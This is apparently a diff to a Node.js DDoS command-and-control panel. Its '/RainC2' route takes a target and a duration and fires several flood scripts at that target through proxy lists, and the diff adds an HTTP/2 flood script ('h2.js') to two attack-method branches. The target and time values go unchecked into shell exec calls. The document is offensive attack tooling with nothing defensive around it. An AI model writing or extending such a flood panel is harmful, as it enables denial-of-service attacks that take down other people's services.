@@ -41,6 +41,7 @@ app.get('/RainC2', (req, res) => {
     exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
     exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
     exec(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
+    exec(`node h2.js ${target} ${time} 19 8 proxy.txt`);
     exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
     exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
   } else if (methods === 'PRIV-TOR') {
@@ -55,6 +56,7 @@ app.get('/RainC2', (req, res) => {
     console.log('received');
     exec(`node methods/http-panel.js ${target} ${time}`);
     exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
+    exec(`node h2.js ${target} ${time} 19 8 proxy.txt`);
   } else if (methods === 'R1') {
     console.log('received');
     exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
